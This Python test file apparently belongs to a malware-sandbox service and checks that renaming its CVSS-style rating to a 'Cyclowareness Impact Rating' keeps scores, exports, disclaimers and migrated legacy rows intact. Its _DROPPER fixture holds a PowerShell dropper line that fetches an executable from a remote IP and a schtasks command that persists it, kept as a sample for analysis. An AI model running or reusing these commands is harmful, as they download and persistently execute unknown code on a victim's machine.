"""The rating stopped being called CVSS, and nothing else about it moved.

FIRST scopes CVSS to vulnerabilities. Rating a malware sample with it was a
category error that our exactly-correct arithmetic made worse, not better — being
precisely wrong is harder to argue with than being approximately right. The number
is now the Cyclowareness Impact Rating (CIR v1).

Four things have to hold for that to have been a rename rather than a rewrite:

1. The magnitude did not move. A dropper that rated 7.5 still rates 7.5, on the
   same metrics — if the rename had shifted scores, every historical report would
   silently disagree with the engine that produced it.
2. Nothing claims CVSS any more. Not the vector prefix, not the exports.
3. Every surface states what the rating is and is not. A bare 0-10 number on a
   security report is read as CVSS unless it says otherwise.
4. A row written before the rename still renders. The column was renamed rather
   than added-and-backfilled precisely so the values travel with the row.
"""
from __future__ import annotations

import json

import pytest
import sqlalchemy as sa
from sqlalchemy.orm import sessionmaker

from app import db as app_db
from app.engine import impact, pipeline, report as report_mod, storage
from app.engine.models import JobStatus, SandboxJob

#: The dropper from the real-results suite. Its rating before the rename was
#: 7.5 / high on CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:L — captured from the
#: shipped build and pinned here so the rename cannot quietly re-rate anything.
_DROPPER = (
    b"$b='SQBFAFgA';IEX([Convert]::FromBase64String($b));"
    b"(New-Object Net.WebClient).DownloadFile('http://185.220.101.5/x.exe','a.exe')\n"
    b"schtasks /create /tn U /tr a.exe /f\n"
)
_DROPPER_METRICS = {
    "AV": "N", "AC": "H", "PR": "N", "UI": "R", "S": "C", "C": "L", "I": "H", "A": "L",
}
_DROPPER_SCORE = 7.5


def _run(db, payload: bytes, name: str) -> SandboxJob:
    job = pipeline.new_job(db, storage.store_bytes(payload), original_name=name, tenant="default")
    db.commit()
    pipeline.run(db, job)
    db.commit()
    assert job.status == JobStatus.COMPLETED
    return job


# --- 1. the magnitude did not move -------------------------------------------


def test_dropper_rating_is_unchanged_by_the_rename(db):
    job = _run(db, _DROPPER, "update.ps1")

    assert job.impact["metrics"] == _DROPPER_METRICS
    assert job.impact["base_score"] == _DROPPER_SCORE
    assert job.impact["severity"] == "high"
    assert job.impact["vector"] == (
        "CIR:1.0/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:L"
    )


def test_the_arithmetic_is_the_cvss_arithmetic_under_the_new_name():
    """Same equations, same answer — only the notation changed."""
    assert impact.score(_DROPPER_METRICS) == _DROPPER_SCORE
    assert impact.vector_string(_DROPPER_METRICS).startswith("CIR:1.0/")


# --- 2. nothing claims CVSS any more -----------------------------------------


def test_no_export_publishes_a_cvss_vector(db):
    job = _run(db, _DROPPER, "update.ps1")

    as_json = json.dumps(report_mod.as_json(job))
    as_stix = json.dumps(report_mod.as_stix(job))
    assert "CVSS:3.1/" not in as_json
    assert "CVSS:3.1/" not in as_stix
    # The old key is gone from the payload; the rating lives under `impact`.
    assert "cvss" not in report_mod.as_json(job)
    assert report_mod.as_json(job)["impact"]["rating"] == "CIR:1.0"


# --- 3. every surface says what it is ----------------------------------------


def test_the_stix_bundle_carries_the_rating_and_the_disclaimer(db):
    """A bundle ingested by a TIP has to explain the number it is carrying."""
    import stix2

    job = _run(db, _DROPPER, "update.ps1")
    bundle = report_mod.as_stix(job)
    stix2.parse(bundle, allow_custom=False)

    notes = [o for o in bundle["objects"] if o["type"] == "note"]
    assert len(notes) == 1, "the impact rating must reach the bundle exactly once"
    assert "Cyclowareness Impact Rating" in notes[0]["abstract"]
    assert job.impact["vector"] in notes[0]["content"]
    assert "not CVSS" in notes[0]["content"]

    # A Note is an annotation, not an accusation: it must not have been modelled
    # as an indicator, which a TIP would turn into a blocklist entry.
    assert notes[0]["object_refs"], "the note must be attached to the file it rates"


def test_the_api_payload_names_the_rating(client, auth, db):
    job = _run(db, _DROPPER, "update.ps1")

    detail = client.get(f"/api/result/{job.public_id}", headers=auth)
    assert detail.status_code == 200, detail.text
    body = detail.json()
    assert "cvss" not in body
    assert body["impact"]["vector"].startswith("CIR:1.0/")
    assert "not CVSS" in body["impact"]["disclaimer"]


# --- 4. a row from before the rename still renders ----------------------------


@pytest.fixture()
def legacy_engine(tmp_path, monkeypatch):
    """A throwaway database bound in place of the service's engine.

    Same trick as the upgrade-path suite: init_db() and get_db() read these
    module globals at call time, so swapping them redirects the application.
    """
    url = "sqlite:///" + str(tmp_path / "impact-rename.db").replace("\\", "/")
    engine = sa.create_engine(url, connect_args={"check_same_thread": False}, future=True)
    monkeypatch.setattr(app_db, "engine", engine)
    monkeypatch.setattr(
        app_db,
        "SessionLocal",
        sessionmaker(bind=engine, autoflush=False, expire_on_commit=False),
    )
    try:
        yield engine
    finally:
        engine.dispose()


def _alembic(engine: sa.Engine, action: str, revision: str) -> None:
    from alembic import command

    config = app_db.alembic_config()
    with engine.begin() as connection:
        config.attributes["connection"] = connection
        getattr(command, action)(config, revision)


def test_a_row_rated_before_the_rename_survives_the_migration(legacy_engine):
    """The rating a customer already has must still be there afterwards.

    Rated by the previous release, so the stored vector reads ``CVSS:3.1/``. It is
    left exactly as written — rewriting the notation on an old row would falsify
    the record of what the engine actually said — but it has to keep rendering.
    """
    app_db.init_db()
    _alembic(legacy_engine, "downgrade", "0002_cvss_verdict_mitre")

    legacy_rating = {
        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:L",
        "base_score": 7.5,
        "severity": "high",
        "metrics": _DROPPER_METRICS,
        "rationale": [{"metric": "AV", "value": "N", "why": "Reaches the network"}],
    }
    with legacy_engine.begin() as connection:
        connection.execute(
            sa.text(
                "INSERT INTO sandbox_jobs (public_id, source, original_name, sha256,"
                " md5, size_bytes, mime, magic, family, extension_mismatch, status,"
                " stage, tiers, analysis, iocs, score_breakdown, rule_score, ai_score,"
                " final_score, risk_level, dynamic, cvss, verdict, mitre, created_at)"
                " VALUES ('pre-rename', 'upload', 'update.ps1', 'aa', 'bb', 12,"
                " 'text/plain', 'ASCII', 'script', 0, 'completed', 'complete',"
                " '{}', '{}', '{}', '{}', 70.0, 0.0, 70.0, 'high', '{}', :rating,"
                " '{}', '[]', '2026-01-01 00:00:00')"
            ),
            {"rating": json.dumps(legacy_rating)},
        )

    app_db.init_db()

    columns = {c["name"] for c in sa.inspect(legacy_engine).get_columns("sandbox_jobs")}
    assert "impact" in columns and "cvss" not in columns

    session = sessionmaker(bind=legacy_engine)()
    try:
        job = session.execute(
            sa.select(SandboxJob).where(SandboxJob.public_id == "pre-rename")
        ).scalar_one()
        assert job.impact == legacy_rating

        exported = report_mod.as_json(job)
        assert exported["impact"]["base_score"] == 7.5
        assert report_mod.as_pdf(job), "an old row must still produce a PDF"
    finally:
        session.close()


def test_a_job_object_carrying_only_the_old_attribute_still_renders():
    """A payload exported before the rename, re-rendered.

    The report layer works on anything with the right attributes, so a case file
    reconstituted from an older export reaches it with `cvss` and no `impact`.
    Rendering that as an empty severity panel would lose a finding the export
    plainly contains.
    """
    class _LegacyJob:
        public_id = "legacy"
        original_name = "update.ps1"
        sha256 = "aa"
        risk_level = "high"
        final_score = 70.0
        cvss = {"vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:L", "base_score": 7.5,
                "severity": "high", "metrics": _DROPPER_METRICS, "rationale": []}

    exported = report_mod.as_json(_LegacyJob())
    assert exported["impact"]["base_score"] == 7.5
